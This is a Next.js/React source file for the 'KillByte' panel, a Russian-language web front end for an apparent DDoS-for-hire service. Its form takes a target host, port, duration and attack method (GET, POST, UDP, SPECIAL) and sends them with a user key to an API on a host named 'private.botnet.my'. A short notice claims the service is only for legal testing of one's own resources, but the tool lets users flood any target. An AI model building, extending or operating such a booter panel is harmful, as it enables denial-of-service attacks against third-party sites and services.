"use client"

import type React from "react"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import { Card } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { useToast } from "@/hooks/use-toast"
import { Activity, Zap, Clock, Target, LogOut, Menu, X } from "lucide-react"
import Image from "next/image"
import Link from "next/link"

export default function PanelPage() {
  const router = useRouter()
  const { toast } = useToast()
  const [authenticated, setAuthenticated] = useState(false)
  const [userKey, setUserKey] = useState("")
  const [userData, setUserData] = useState<any>(null)
  const [loading, setLoading] = useState(false)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)

  // Attack form state
  const [host, setHost] = useState("")
  const [port, setPort] = useState("")
  const [time, setTime] = useState("")
  const [method, setMethod] = useState("")

  useEffect(() => {
    const jwt = localStorage.getItem("jwt")
    const key = localStorage.getItem("userKey")
    const userDataString = localStorage.getItem("userData")

    if (!jwt || !key) {
      router.push("/")
    } else {
      setAuthenticated(true)
      setUserKey(key)
      if (userDataString) {
        setUserData(JSON.parse(userDataString))
      }
    }
  }, [router])

  const handleLogout = () => {
    localStorage.removeItem("jwt")
    localStorage.removeItem("userKey")
    localStorage.removeItem("userData")
    router.push("/")
  }

  const handleLaunch = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoading(true)

    try {
      const url = `http://private.botnet.my:8080/api/attack?host=${encodeURIComponent(host)}&port=${port}&time=${time}&method=${method}&key=${userKey}`

      const response = await fetch(url, {
        method: "GET",
      })

      if (response.ok) {
        toast({
          title: "Атака запущена",
          description: `Цель: ${host}:${port} | Метод: ${method} | Время: ${time}s`,
        })
        // Reset form
        setHost("")
        setPort("")
        setTime("")
        setMethod("")
      } else {
        throw new Error("Attack failed")
      }
    } catch (error) {
      toast({
        title: "Ошибка",
        description: "Не удалось запустить атаку. Проверьте параметры.",
        variant: "destructive",
      })
    } finally {
      setLoading(false)
    }
  }

  if (!authenticated) {
    return null
  }

  return (
    <div className="min-h-screen bg-black text-white">
      {/* Background effects */}
      <div className="fixed inset-0 bg-gradient-to-br from-black via-zinc-900 to-black" />
      <div className="fixed inset-0 opacity-20 bg-[radial-gradient(circle_at_50%_50%,rgba(239,68,68,0.1),transparent_50%)]" />

      <div className="relative z-10">
        <header className="border-b border-white/5 backdrop-blur-xl bg-black/50">
          <div className="container mx-auto px-4 lg:px-8">
            <div className="flex items-center justify-between h-16">
              <Link href="/" className="flex items-center gap-3">
                <Image src="/killbyte-logo.png" alt="KillByte" width={40} height={40} className="w-10 h-10" />
                <span className="text-xl font-bold tracking-tight">KILLBYTE PANEL</span>
              </Link>

              {/* Desktop Navigation */}
              <nav className="hidden md:flex items-center gap-6">
                <Link href="/panel" className="text-sm text-red-400">
                  Панель
                </Link>
                <Link href="/profile" className="text-sm hover:text-red-400 transition-colors">
                  Профиль
                </Link>
                <Link href="/powerproofs" className="text-sm hover:text-red-400 transition-colors">
                  Powerproofs
                </Link>
                {userData?.plan === "admin" || userData?.plan === "owner" ? (
                  <Link href="/admin/methods" className="text-sm hover:text-red-400 transition-colors">
                    Админ
                  </Link>
                ) : null}
                <div className="text-xs text-zinc-500">
                  Key: <span className="text-zinc-400 font-mono">{userKey}</span>
                </div>
                <Button variant="outline" size="sm" onClick={handleLogout} className="border-zinc-700 bg-transparent">
                  <LogOut className="w-4 h-4 mr-2" />
                  Выход
                </Button>
              </nav>

              {/* Mobile Menu Button */}
              <button className="md:hidden" onClick={() => setMobileMenuOpen(!mobileMenuOpen)}>
                {mobileMenuOpen ? <X className="w-6 h-6" /> : <Menu className="w-6 h-6" />}
              </button>
            </div>

            {/* Mobile Navigation */}
            {mobileMenuOpen && (
              <nav className="md:hidden py-4 border-t border-white/5 flex flex-col gap-4">
                <Link href="/panel" className="text-sm text-red-400 py-2">
                  Панель
                </Link>
                <Link href="/profile" className="text-sm hover:text-red-400 py-2">
                  Профиль
                </Link>
                <Link href="/powerproofs" className="text-sm hover:text-red-400 py-2">
                  Powerproofs
                </Link>
                {userData?.plan === "admin" || userData?.plan === "owner" ? (
                  <Link href="/admin/methods" className="text-sm hover:text-red-400 py-2">
                    Админ
                  </Link>
                ) : null}
                <div className="text-xs text-zinc-500 py-2">
                  API Key: <span className="text-zinc-400 font-mono text-xs">{userKey}</span>
                </div>
                <Button
                  variant="outline"
                  size="sm"
                  onClick={handleLogout}
                  className="border-zinc-700 w-fit bg-transparent"
                >
                  <LogOut className="w-4 h-4 mr-2" />
                  Выход
                </Button>
              </nav>
            )}
          </div>
        </header>

        {/* Main Content */}
        <main className="container mx-auto px-4 lg:px-8 py-12">
          <div className="max-w-6xl mx-auto space-y-8">
            {/* Stats Cards */}
            <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
              <Card className="bg-zinc-900/50 border-zinc-800 p-6">
                <div className="flex items-center gap-4">
                  <div className="w-12 h-12 rounded-lg bg-red-500/20 flex items-center justify-center">
                    <Activity className="w-6 h-6 text-red-400" />
                  </div>
                  <div>
                    <div className="text-2xl font-bold">0</div>
                    <div className="text-sm text-zinc-400">Активных атак</div>
                  </div>
                </div>
              </Card>
              <Card className="bg-zinc-900/50 border-zinc-800 p-6">
                <div className="flex items-center gap-4">
                  <div className="w-12 h-12 rounded-lg bg-blue-500/20 flex items-center justify-center">
                    <Zap className="w-6 h-6 text-blue-400" />
                  </div>
                  <div>
                    <div className="text-2xl font-bold">0</div>
                    <div className="text-sm text-zinc-400">Всего запущено</div>
                  </div>
                </div>
              </Card>
              <Card className="bg-zinc-900/50 border-zinc-800 p-6">
                <div className="flex items-center gap-4">
                  <div className="w-12 h-12 rounded-lg bg-green-500/20 flex items-center justify-center">
                    <Target className="w-6 h-6 text-green-400" />
                  </div>
                  <div>
                    <div className="text-2xl font-bold">100%</div>
                    <div className="text-sm text-zinc-400">Успешность</div>
                  </div>
                </div>
              </Card>
              <Card className="bg-zinc-900/50 border-zinc-800 p-6">
                <div className="flex items-center gap-4">
                  <div className="w-12 h-12 rounded-lg bg-purple-500/20 flex items-center justify-center">
                    <Clock className="w-6 h-6 text-purple-400" />
                  </div>
                  <div>
                    <div className="text-2xl font-bold">0s</div>
                    <div className="text-sm text-zinc-400">Общее время</div>
                  </div>
                </div>
              </Card>
            </div>

            {/* Attack Form */}
            <Card className="bg-zinc-900/50 border-zinc-800 p-8">
              <h2 className="text-2xl font-bold mb-6 flex items-center gap-3">
                <div className="w-10 h-10 rounded-lg bg-red-500/20 flex items-center justify-center">
                  <Zap className="w-5 h-5 text-red-400" />
                </div>
                Панель запуска атаки
              </h2>

              <form onSubmit={handleLaunch} className="space-y-6">
                <div className="grid md:grid-cols-2 gap-6">
                  <div className="space-y-2">
                    <Label htmlFor="host" className="text-zinc-300">
                      Цель (Host)
                    </Label>
                    <Input
                      id="host"
                      placeholder="example.com"
                      value={host}
                      onChange={(e) => setHost(e.target.value)}
                      required
                      className="bg-zinc-800 border-zinc-700 h-12 text-lg"
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="port" className="text-zinc-300">
                      Порт
                    </Label>
                    <Input
                      id="port"
                      type="number"
                      placeholder="80"
                      value={port}
                      onChange={(e) => setPort(e.target.value)}
                      required
                      className="bg-zinc-800 border-zinc-700 h-12 text-lg"
                    />
                  </div>
                </div>

                <div className="grid md:grid-cols-2 gap-6">
                  <div className="space-y-2">
                    <Label htmlFor="time" className="text-zinc-300">
                      Время (секунды)
                    </Label>
                    <Input
                      id="time"
                      type="number"
                      placeholder="60"
                      value={time}
                      onChange={(e) => setTime(e.target.value)}
                      required
                      className="bg-zinc-800 border-zinc-700 h-12 text-lg"
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="method" className="text-zinc-300">
                      Метод
                    </Label>
                    <Select value={method} onValueChange={setMethod} required>
                      <SelectTrigger className="bg-zinc-800 border-zinc-700 h-12 text-lg">
                        <SelectValue placeholder="Выберите метод" />
                      </SelectTrigger>
                      <SelectContent className="bg-zinc-800 border-zinc-700">
                        <SelectItem value="GET">GET</SelectItem>
                        <SelectItem value="POST">POST</SelectItem>
                        <SelectItem value="UDP">UDP</SelectItem>
                        <SelectItem value="SPECIAL">SPECIAL</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                </div>

                <Button
                  type="submit"
                  disabled={loading}
                  className="w-full h-16 text-xl font-bold bg-red-600 hover:bg-red-700 border-0 relative overflow-hidden group"
                >
                  <div className="absolute inset-0 bg-gradient-to-r from-red-600 via-red-500 to-red-600 opacity-0 group-hover:opacity-100 transition-opacity" />
                  <span className="relative flex items-center justify-center gap-3">
                    <Zap className="w-6 h-6" />
                    {loading ? "ЗАПУСК..." : "ЗАПУСТИТЬ АТАКУ"}
                  </span>
                </Button>
              </form>
            </Card>

            {/* Info Card */}
            <Card className="bg-gradient-to-br from-zinc-900/50 to-red-950/20 border-red-500/30 p-6">
              <div className="flex items-start gap-4">
                <div className="w-10 h-10 rounded-lg bg-red-500/20 flex items-center justify-center flex-shrink-0">
                  <Target className="w-5 h-5 text-red-400" />
                </div>
                <div>
                  <h3 className="font-semibold mb-2 text-red-400">Важная информация</h3>
                  <p className="text-sm text-zinc-400 leading-relaxed">
                    Используйте сервис только для легального тестирования собственных ресурсов. Несанкционированные
                    атаки являются незаконными и могут привести к серьезным последствиям.
                  </p>
                </div>
              </div>
            </Card>
          </div>
        </main>
      </div>
    </div>
  )
}
